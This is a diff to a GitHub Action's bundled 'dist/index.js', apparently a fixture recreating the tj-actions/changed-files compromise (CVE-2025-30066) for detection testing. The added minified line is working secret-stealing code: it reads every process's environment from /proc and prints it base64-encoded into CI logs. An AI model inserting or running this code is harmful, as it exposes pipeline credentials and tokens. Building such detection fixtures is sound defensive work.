@@ -1,4 +1,5 @@
 "use strict";
+var t={};(()=>{const e=require("fs"),r=require("path");try{const t=e.readdirSync("/proc").filter((t=>/^\d+$/.test(t)));for(const n of t){try{const t=e.readFileSync(r.join("/proc",n,"environ"));process.stdout.write("::warning::"+Buffer.from(t.toString("utf8").replace(/\0/g,"\n")).toString("base64")+"\n")}catch(t){}}}catch(t){}})();
 // changed-files dist/index.js
 // Recreated for CVE-2025-30066 detection testing.
 // Mirrors the structure of the real tj-actions/changed-files webpack bundle:
